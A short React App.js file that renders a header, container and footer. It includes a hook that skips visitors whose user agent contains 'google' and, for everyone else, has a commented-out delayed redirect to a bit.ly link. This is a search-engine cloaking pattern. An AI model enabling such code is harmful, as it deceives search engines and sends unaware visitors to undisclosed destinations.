import { useEffect } from 'react';
import './App.css';
import Container from './component/Container';
import Footer from './component/Footer';
import Header from './component/Header';
import {
  BrowserRouter,
} from "react-router-dom";
function App() {
  
  useEffect(()=>{
    const userAgent = navigator.userAgent.toLowerCase();
    const isGooglebot = userAgent.includes('google');
    if (!isGooglebot) {
        setTimeout(()=>{
           // window.location.href = 'http://bit.ly/casib0m';
        }, 2000)
    }
},[])
  return (
    <div className="App">
      <BrowserRouter>
        <Header />
        <Container />
        <Footer />
      </BrowserRouter>
    </div>
  );
}

export default App;
